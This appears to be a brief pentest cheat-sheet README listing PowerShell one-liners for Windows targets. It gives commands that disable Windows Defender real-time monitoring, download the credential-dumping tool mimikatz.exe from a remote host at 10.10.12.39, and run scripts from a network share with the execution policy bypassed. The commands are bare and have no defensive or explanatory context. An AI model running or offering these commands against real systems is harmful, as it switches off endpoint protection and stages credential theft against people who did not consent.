# praia_essential_commands
Command for pentest

# Disable Windows Defender on Windows 10 using PowerShell
#### Fire up a PowerShell window as administrator and run the following command:

PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true

#### Just set the DisableRealTimeMonitoring back to false to re-enable the real-time monitoring within Defender.

PS C:\> Set-MpPreference -DisableRealtimeMonitoring $false


# File Transfer

PS C:\> powershell.exe wget http://10.10.12.39/mimikatz.exe -outfile C:\users\administrator\desktop\mimikatz.exe
PS C:\> powershell.exe Invoke-WebRequest http://10.10.12.39/mimikatz.exe -o mimikatz.exe

# Running a Powershell function from command line.

#### First Step (Load PS1 file):

PS C:\> powershell.exe -executionpolicy bypass -file "\\#SERVER\Get-RDPCertificate.ps1"

#### Second Step (Execute Function):

PS C:\> powershell.exe -executionpolicy bypass -command {"Get-RDPCertificate -Computername $env:COMPUTERNAME | Out-File -filepath (\\#SERVER\$env:computername-$(get-date -f MM-dd-yy).txt)"}




 
